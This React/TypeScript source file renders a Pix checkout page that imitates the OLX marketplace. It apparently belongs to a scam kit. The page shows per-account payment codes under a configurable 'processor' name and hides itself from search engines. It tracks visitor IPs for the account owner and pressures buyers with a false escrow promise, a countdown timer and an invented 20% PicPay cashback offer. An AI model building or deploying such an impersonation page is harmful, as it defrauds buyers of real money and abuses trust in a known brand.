import { createFileRoute, useSearch } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { Copy, Clock, X } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { logVisitorActivity, trackStat, fetchCheckoutProduct, getVisitorIp } from "@/lib/tracking";
import { supabase } from "@/integrations/supabase/client";
import { useNavigate } from "@tanstack/react-router";
import olxLogo from "@/assets/olx-logo.png";
import pixIcon from "@/assets/pix-icon.png";
import olxGuaranteeIcon from "@/assets/icons/olx-guarantee-icon.png";
import picpayLogo from "@/assets/picpay-logo.png";

type Search = { produto?: string };

export const Route = createFileRoute("/pix")({
  validateSearch: (s: Record<string, unknown>): Search => ({
    produto: typeof s.produto === "string" ? s.produto : undefined,
  }),
  head: () => ({
    meta: [
      { title: "Pagamento Pix - OLX" },
      { name: "description", content: "Pague com Pix e receba com a garantia OLX." },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: PixPage,
});

interface ProductData {
  id: string;
  name: string;
  price: number;
  garantia_olx: number;
  pix_copia_cola: string | null;
  qr_code_url: string | null;
  user_id: string;
  pix_mode: string;
}

function PixPage() {
  const { produto: searchSlug } = useSearch({ from: "/pix" }) as Search;
  const productSlug =
    searchSlug ??
    (typeof window !== "undefined"
      ? localStorage.getItem("olx_produto_slug") ?? undefined
      : undefined);
  const [product, setProduct] = useState<ProductData | null>(null);
  const [processorName, setProcessorName] = useState("NOVUS LTDA");
  const [loading, setLoading] = useState(true);
  const [showLoading, setShowLoading] = useState(true);
  const [copied, setCopied] = useState(false);
  const [showPicpayModal, setShowPicpayModal] = useState(false);
  const [timeLeft, setTimeLeft] = useState(5 * 60);
  const [hasTracked, setHasTracked] = useState(false);
  const hasLoggedView = useRef(false);
  const navigate = useNavigate();

  // Polling: verifica se o vendedor confirmou o pagamento
  useEffect(() => {
    if (!product) return;
    let stopped = false;
    const check = async () => {
      const ip = await getVisitorIp();
      if (!ip || stopped) return;
      const { data } = await supabase.rpc("get_payment_confirmation", {
        p_product_id: product.id,
        p_ip: ip,
      });
      const row = Array.isArray(data) ? data[0] : data;
      const okStatus = row && ["confirmed", "shipped", "delivered"].includes(String(row.status));
      if (okStatus && !stopped) {
        stopped = true;
        try { localStorage.setItem("olx_produto_slug", productSlug || ""); } catch {}
        navigate({ to: "/pagamento-confirmado", search: { produto: productSlug } as any });
      }
    };
    check();
    const iv = setInterval(check, 5000);
    return () => { stopped = true; clearInterval(iv); };
  }, [product, productSlug, navigate]);

  const [autoTxId, setAutoTxId] = useState<string | null>(null);
  const [autoPixCode, setAutoPixCode] = useState<string | null>(null);
  const [autoQrUrl, setAutoQrUrl] = useState<string | null>(null);
  const [autoError, setAutoError] = useState<string | null>(null);

  useEffect(() => {
    const load = async () => {
      try {
        const p = await fetchCheckoutProduct(productSlug);
        if (!p) { setProduct(null); return; }
        const mode = p.pix_mode || "manual";
        setProduct({
          id: p.id,
          name: p.name,
          price: Number(p.price || 0),
          garantia_olx: Number(p.garantia_olx || 49),
          pix_copia_cola: p.pix_copia_cola ?? null,
          qr_code_url: p.qr_code_url ?? null,
          user_id: p.user_id,
          pix_mode: mode,
        });
        if (typeof p.processor_name === "string" && p.processor_name.trim()) {
          setProcessorName(p.processor_name);
        }
        if (mode === "automatic") {
          const ip = await getVisitorIp();
          try {
            const r = await fetch("/api/blackcat?action=create", {
              method: "POST",
              headers: { "content-type": "application/json" },
              body: JSON.stringify({ product_id: p.id, ip }),
            });
            const data = await r.json();
            if (r.ok && data?.pix_code) {
              setAutoPixCode(data.pix_code);
              setAutoQrUrl(data.qr_code_url || null);
              setAutoTxId(data.transaction_id || null);
            } else {
              setAutoError(
                typeof data?.error === "string"
                  ? data.error
                  : "Não foi possível gerar o Pix automático agora.",
              );
              console.warn("Pix automático falhou", data);
            }
          } catch (e) {
            setAutoError("Não foi possível gerar o Pix automático agora.");
            console.warn("Pix automático erro", e);
          }
        }
      } finally {
        setLoading(false);
      }
    };
    load();
  }, [productSlug]);

  // Polling do status (PIX automático)
  useEffect(() => {
    if (!product || product.pix_mode !== "automatic" || !autoTxId) return;
    let stopped = false;
    const check = async () => {
      try {
        const ip = await getVisitorIp();
        const qs = new URLSearchParams({ action: "status", id: autoTxId, product_id: product.id, ip: ip || "" });
        const r = await fetch(`/api/blackcat?${qs.toString()}`);
        const data = await r.json();
        if (data?.status === "paid" && !stopped) {
          stopped = true;
          try { localStorage.setItem("olx_produto_slug", productSlug || ""); } catch {}
          navigate({ to: "/pagamento-confirmado", search: { produto: productSlug } as any });
        }
      } catch {}
    };
    check();
    const iv = setInterval(check, 5000);
    return () => { stopped = true; clearInterval(iv); };
  }, [product, autoTxId, productSlug, navigate]);

  useEffect(() => {
    const t = setTimeout(() => setShowLoading(false), 3000);
    return () => clearTimeout(t);
  }, []);

  useEffect(() => {
    if (product && !hasTracked && !showLoading && productSlug) {
      trackStat("pix_generated", undefined, productSlug);
      setHasTracked(true);
      if (!hasLoggedView.current) {
        hasLoggedView.current = true;
        logVisitorActivity(product.user_id, "pix_generated", productSlug, product.name, undefined, product.id);
      }
    }
  }, [product, hasTracked, showLoading, productSlug]);

  useEffect(() => {
    if (showLoading) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev <= 0 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, [showLoading]);

  const effectivePixCode = product?.pix_mode === "automatic" ? autoPixCode : product?.pix_copia_cola;
  const effectiveQrCode = product?.pix_mode === "automatic" ? autoQrUrl : product?.qr_code_url;

  const handleCopyCode = async () => {
    if (!effectivePixCode) return;
    await navigator.clipboard.writeText(effectivePixCode);
    setCopied(true);
    trackStat("pix_copied", undefined, productSlug);
    if (product) logVisitorActivity(product.user_id, "pix_copied", productSlug, product.name, undefined, product.id);
    setTimeout(() => setCopied(false), 3000);
  };

  const truncatePixCode = (code: string, maxLength = 20) =>
    code.length > maxLength ? code.substring(0, maxLength) + "..." : code;

  if (loading || showLoading) {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <header className="px-4 py-3 md:px-8">
          <img src={olxLogo} alt="OLX" className="h-7" />
        </header>
        <div className="flex-1 flex flex-col items-center justify-center px-4">
          <div className="relative w-10 h-10 mb-5">
            <svg className="animate-spin" viewBox="0 0 50 50">
              <circle cx="25" cy="25" r="20" fill="none" stroke="#e5e7eb" strokeWidth="3" />
              <circle cx="25" cy="25" r="20" fill="none" stroke="#6e0ad6" strokeWidth="3" strokeLinecap="round" strokeDasharray="31.4, 94.2" />
            </svg>
          </div>
          <p className="text-[#222] text-center text-base leading-relaxed">
            Estamos gerando seu código PIX.<br />Aguarde...
          </p>
        </div>
      </div>
    );
  }

  if (!product) {
    return (
      <div className="min-h-screen bg-white">
        <header className="px-4 py-3 md:px-8">
          <img src={olxLogo} alt="OLX" className="h-7" />
        </header>
        <main className="max-w-md mx-auto p-4">
          <div className="text-center py-12">
            <h1 className="text-xl font-bold mb-2">Produto não encontrado</h1>
            <p className="text-gray-500">O produto que você procura não existe ou foi removido.</p>
          </div>
        </main>
      </div>
    );
  }

  const totalPrice = product.price + (product.garantia_olx || 49);
  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;

  const QrCodeImage = ({ className }: { className?: string }) => {
    if (effectiveQrCode) {
      return (
        <img
          src={effectiveQrCode}
          alt="QR Code"
          className={`object-contain border border-gray-200 rounded-lg p-2 ${className || "w-48 h-48"}`}
        />
      );
    }
    if (effectivePixCode) {
      return (
        <div className={`flex items-center justify-center border border-gray-200 rounded-lg p-2 ${className || "w-48 h-48"}`}>
          <QRCodeSVG value={effectivePixCode} size={160} />
        </div>
      );
    }
    return (
      <div className={`border-2 border-dashed border-gray-300 rounded-lg flex flex-col items-center justify-center text-center text-gray-500 p-3 ${className || "w-48 h-48"}`}>
        <span className="text-xs leading-snug">
          {autoError || "QR Code indisponível no momento."}
        </span>
      </div>
    );
  };

  const DesktopLayout = () => (
    <div className="min-h-screen bg-[#f5f5f5]">
      <header className="bg-white px-8 py-4 border-b border-gray-100">
        <img src={olxLogo} alt="OLX" className="h-8" />
      </header>
      <main className="max-w-2xl mx-auto px-6 py-10">
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-8">
          <div className="bg-[#fef3cd] rounded-xl p-4 mb-6">
            <div className="flex gap-3 items-center justify-center">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="#d4a017" strokeWidth="2"/>
                <path d="M12 8v4M12 16h.01" stroke="#d4a017" strokeWidth="2" strokeLinecap="round"/>
              </svg>
              <p className="text-[15px] text-[#222]">
                O pagamento só é liberado ao vendedor quando você receber sua mercadoria!
              </p>
            </div>
          </div>

          {/* Cashback PicPay */}
          <button type="button" onClick={() => setShowPicpayModal(true)} className="w-full text-left relative overflow-hidden rounded-2xl p-4 mb-6 bg-gradient-to-br from-[#11C76F] via-[#10B981] to-[#059669] shadow-[0_8px_24px_-8px_rgba(17,199,111,0.55)] flex items-center gap-4 transition-transform hover:scale-[1.01] active:scale-[0.99]">
            <div className="absolute -right-6 -top-6 w-28 h-28 rounded-full bg-white/10" />
            <div className="absolute -right-10 -bottom-10 w-32 h-32 rounded-full bg-white/5" />
            <div className="flex-shrink-0 w-12 h-12 rounded-full bg-white shadow-md flex items-center justify-center overflow-hidden">
              <img src={picpayLogo} alt="PicPay" className="w-11 h-11 object-contain" loading="lazy" />
            </div>
            <div className="relative flex-1 min-w-0">
              <p className="text-white/90 text-[12px] font-medium uppercase tracking-wide leading-none mb-1">Oferta exclusiva</p>
              <p className="text-white text-[15px] font-semibold leading-snug">
                Receba <span className="font-extrabold text-white bg-white/15 px-1.5 py-0.5 rounded">20% de cashback</span> pagando pelo PicPay
              </p>
            </div>
          </button>

          <div className="mb-6">
            <div className="h-1.5 rounded-full bg-[#f56e00] mb-4 max-w-xs" />
            <div className="flex items-center justify-center gap-2">
              <Clock className="h-5 w-5 text-[#555]" />
              <span className="text-[15px] text-[#222]">Seu código expira em:</span>
              <span className="text-[#f56e00] font-bold text-[15px]">
                {String(minutes).padStart(2, "0")}m {String(seconds).padStart(2, "0")}s
              </span>
            </div>
          </div>

          <div className="flex items-center justify-center gap-8 py-4 mb-6 border-b border-gray-100">
            <div className="flex items-center gap-3">
              <img src={pixIcon} alt="Pix" className="w-10 h-10 object-contain" />
              <div>
                <p className="text-xs text-[#777]">Pague por Pix</p>
                <p className="text-sm font-bold text-[#f56e00]">R$ {totalPrice.toLocaleString("pt-BR")}</p>
              </div>
            </div>
            <div className="w-px h-10 bg-gray-200" />
            <div className="flex items-center gap-3">
              <img src={olxGuaranteeIcon} alt="Processador" className="w-10 h-10 object-contain" />
              <div>
                <p className="text-xs text-[#777]">Processado por</p>
                <p className="text-sm font-bold text-[#222]">{processorName}</p>
              </div>
            </div>
          </div>

          <div className="mb-8">
            <h2 className="font-bold text-[#222] text-base mb-4">É rápido e prático. Veja como é fácil:</h2>
            <div className="space-y-3 text-sm text-[#222] mb-6">
              <p>1. Abra o app ou banco de sua preferência, escolha a opção pagar via Pix</p>
              <p>2. Escolha pagar Pix com QR Code e escaneie o código abaixo:</p>
              <p>3. Confira se o pagamento será feito para nossa parceira <span className="font-bold">{processorName}</span> e se todas as informações estão corretas.</p>
              <p>4. Confirme o pagamento.</p>
            </div>
            <div className="flex justify-center mb-8"><QrCodeImage /></div>
          </div>

          <div className="border-t border-gray-100 pt-6">
            <h3 className="font-bold text-[#222] text-base mb-4">Ou se preferir, faça o pagamento com o Pix copia e cola</h3>
            <p className="text-sm text-[#555] mb-4">
              Acesse o app do seu banco ou Internet Banking, escolha a opção pagar com <span className="font-bold text-[#222]">Pix copia e cola</span>. Depois cole o código, confira se o pagamento será feito para nossa parceira <span className="font-bold text-[#222]">{processorName}</span> e se todas as informações estão corretas. Confirme o pagamento.
            </p>
            <div className="flex items-center justify-between bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 mb-4">
              <span className="text-sm text-[#555] font-mono truncate flex-1 mr-4">
                {effectivePixCode ? truncatePixCode(effectivePixCode, 40) : "00020101021226940014br.gov.bcb.pix2572qrcode.hy..."}
              </span>
              <button onClick={handleCopyCode} className="text-[#f56e00] font-semibold text-sm flex-shrink-0" disabled={!effectivePixCode}>Copiar</button>
            </div>
            <button onClick={handleCopyCode}
              className="w-full flex items-center justify-center gap-2 bg-[#f56e00] text-white py-3.5 rounded-full font-semibold text-[15px] disabled:opacity-50"
              disabled={!effectivePixCode}>
              <Copy className="h-5 w-5" />
              {copied ? "Código copiado!" : "Copiar código Pix"}
            </button>
          </div>
        </div>
      </main>
    </div>
  );

  const MobileLayout = () => (
    <div className="min-h-screen bg-[#f5f5f5]">
      <header className="bg-white px-4 py-3">
        <img src={olxLogo} alt="OLX" className="h-7" />
      </header>
      <main className="max-w-md mx-auto px-4 py-5">
        <div className="bg-[#fef3cd] rounded-2xl p-4 mb-4">
          <div className="flex gap-3">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5">
              <circle cx="12" cy="12" r="10" stroke="#d4a017" strokeWidth="2"/>
              <path d="M12 8v4M12 16h.01" stroke="#d4a017" strokeWidth="2" strokeLinecap="round"/>
            </svg>
            <p className="text-[15px] text-[#222] leading-snug">
              O pagamento só é liberado ao vendedor quando você receber sua mercadoria!
            </p>
          </div>
        </div>

        {/* Cashback PicPay */}
        <button type="button" onClick={() => setShowPicpayModal(true)} className="w-full text-left relative overflow-hidden rounded-2xl p-4 mb-4 bg-gradient-to-br from-[#11C76F] via-[#10B981] to-[#059669] shadow-[0_8px_24px_-8px_rgba(17,199,111,0.55)] flex items-center gap-3 transition-transform active:scale-[0.99]">
          <div className="absolute -right-6 -top-6 w-24 h-24 rounded-full bg-white/10" />
          <div className="absolute -right-10 -bottom-10 w-28 h-28 rounded-full bg-white/5" />
          <div className="flex-shrink-0 w-12 h-12 rounded-full bg-white shadow-md flex items-center justify-center overflow-hidden">
            <img src={picpayLogo} alt="PicPay" className="w-11 h-11 object-contain" loading="lazy" />
          </div>
          <div className="relative flex-1 min-w-0">
            <p className="text-white/90 text-[11px] font-medium uppercase tracking-wide leading-none mb-1">Oferta exclusiva</p>
            <p className="text-white text-[14px] font-semibold leading-snug">
              Receba <span className="font-extrabold bg-white/15 px-1.5 py-0.5 rounded">20% de cashback</span> pagando pelo PicPay
            </p>
          </div>
        </button>

        <div className="bg-white rounded-2xl p-4 mb-4 shadow-sm">
          <div className="h-1.5 rounded-full bg-[#f56e00] mb-4" />
          <div className="flex items-center gap-2">
            <Clock className="h-5 w-5 text-[#555]" />
            <span className="text-[15px] text-[#222]">Seu código expira em:</span>
            <span className="text-[#f56e00] font-bold text-[15px]">{String(minutes).padStart(2, "0")}m</span>
            <span className="text-[#f56e00] font-bold text-[15px]">{String(seconds).padStart(2, "0")}s</span>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-sm mb-4">
          <div className="flex">
            <div className="flex-1 p-4 flex items-center gap-3">
              <img src={pixIcon} alt="Pix" className="w-9 h-9 object-contain" />
              <div>
                <p className="text-xs text-[#777]">Pague por</p>
                <p className="text-sm font-bold text-[#222]">Pix</p>
                <p className="text-sm font-bold text-[#f56e00]">R$ {totalPrice.toLocaleString("pt-BR")}</p>
              </div>
            </div>
            <div className="w-px bg-gray-200 my-3" />
            <div className="flex-1 p-4 flex items-center gap-3">
              <img src={olxGuaranteeIcon} alt="Processador" className="w-9 h-9 object-contain" />
              <div>
                <p className="text-xs text-[#777]">Processado por</p>
                <p className="text-sm font-bold text-[#222]">{processorName}</p>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl p-4 shadow-sm">
          <h2 className="font-bold text-[#222] text-[15px] mb-4">É rápido e prático. Veja como é fácil:</h2>
          <p className="text-sm text-[#222] mb-4">1. Copie o código de pagamento no botão abaixo</p>
          <div className="flex items-center justify-between border border-gray-300 rounded-lg px-3 py-3 mb-4 gap-2">
            <span className="text-sm text-[#555] font-mono truncate flex-1 min-w-0">
              {effectivePixCode ? truncatePixCode(effectivePixCode) : "00020101021226..."}
            </span>
            <button onClick={handleCopyCode} className="text-[#f56e00] font-semibold text-sm flex-shrink-0" disabled={!effectivePixCode}>Copiar</button>
          </div>
          <button onClick={handleCopyCode}
            className="w-full flex items-center justify-center gap-2 bg-[#f56e00] text-white py-3.5 rounded-full font-semibold text-[15px] mb-6 disabled:opacity-50"
            disabled={!effectivePixCode}>
            <Copy className="h-5 w-5" />
            {copied ? "Código copiado!" : "Copiar código Pix"}
          </button>
          <div className="space-y-4 text-sm text-[#222]">
            <p>2. Acesse o app do seu banco ou Internet Banking e escolha a opção pagar com <span className="font-bold">Pix copia e cola</span>.</p>
            <p>3. Cole o código, confira se o pagamento será feito para nossa parceira <span className="font-bold">{processorName}</span> e se todas as informações estão corretas.</p>
            <p>4. Confirme o pagamento.</p>
            <p>5. <span className="text-[#222] font-medium">Prontinho!</span> Acompanhe o seu pedido em <a href="https://conta.olx.com.br/acesso" target="_blank" rel="noopener noreferrer" className="font-bold text-[#6e0ad6] hover:underline">Minhas Compras</a></p>
          </div>
        </div>
      </main>
    </div>
  );

  return (
    <>
      <div className="md:hidden"><MobileLayout /></div>
      <div className="hidden md:block"><DesktopLayout /></div>

      {/* PicPay Cashback Modal */}
      {showPicpayModal && (
        <div
          className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm flex items-end md:items-center justify-center p-0 md:p-4 animate-in fade-in duration-200"
          onClick={() => setShowPicpayModal(false)}
        >
          <div
            className="relative bg-white w-full md:max-w-md rounded-t-3xl md:rounded-3xl overflow-hidden shadow-2xl animate-in slide-in-from-bottom-4 duration-300"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Header gradient */}
            <div className="relative bg-gradient-to-br from-[#11C76F] via-[#10B981] to-[#059669] px-5 pt-6 pb-8">
              <button
                type="button"
                onClick={() => setShowPicpayModal(false)}
                aria-label="Fechar"
                className="absolute top-3 right-3 w-9 h-9 rounded-full bg-white/20 hover:bg-white/30 flex items-center justify-center text-white transition-colors"
              >
                <X className="h-5 w-5" />
              </button>
              <div className="absolute -right-8 -top-8 w-32 h-32 rounded-full bg-white/10" />
              <div className="absolute -left-10 -bottom-10 w-32 h-32 rounded-full bg-white/5" />
              <div className="relative flex items-center gap-3">
                <div className="w-14 h-14 rounded-full bg-white shadow-md flex items-center justify-center overflow-hidden">
                  <img src={picpayLogo} alt="PicPay" className="w-12 h-12 object-contain" loading="lazy" />
                </div>
                <div>
                  <p className="text-white/90 text-[11px] font-semibold uppercase tracking-wide">Oferta exclusiva</p>
                  <h3 className="text-white text-lg font-bold leading-tight">20% de cashback no PicPay</h3>
                </div>
              </div>
            </div>

            {/* Body */}
            <div className="p-5 -mt-4 bg-white rounded-t-3xl relative">
              <p className="text-[14px] text-[#444] mb-4">
                Pague o seu Pix copia e cola pelo app do PicPay e receba <span className="font-bold text-[#10B981]">20% do valor de volta</span> em cashback na sua carteira.
              </p>

              <div className="space-y-3">
                {[
                  { n: 1, t: "Copie o código Pix copia e cola desta página." },
                  { n: 2, t: "Abra o app do PicPay no seu celular." },
                  { n: 3, t: "Toque em Pix e depois em Pix Copia e Cola." },
                  { n: 4, t: "Cole o código copiado e confirme o pagamento." },
                  { n: 5, t: "Pronto! O cashback cai automaticamente na sua carteira PicPay em até 7 dias." },
                ].map((s) => (
                  <div key={s.n} className="flex gap-3 items-start">
                    <div className="flex-shrink-0 w-7 h-7 rounded-full bg-[#10B981]/10 text-[#10B981] font-bold text-[13px] flex items-center justify-center">
                      {s.n}
                    </div>
                    <p className="text-[13.5px] text-[#222] leading-snug pt-0.5">{s.t}</p>
                  </div>
                ))}
              </div>

              <div className="mt-5 bg-[#10B981]/8 border border-[#10B981]/20 rounded-xl p-3">
                <p className="text-[12px] text-[#0a7a4f] leading-snug">
                  💡 O cashback é creditado pelo PicPay e é válido apenas para pagamentos realizados através do aplicativo PicPay.
                </p>
              </div>

              <button
                type="button"
                onClick={() => setShowPicpayModal(false)}
                className="w-full mt-5 bg-[#10B981] hover:bg-[#059669] text-white font-semibold py-3.5 rounded-full transition-colors"
              >
                Entendi
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
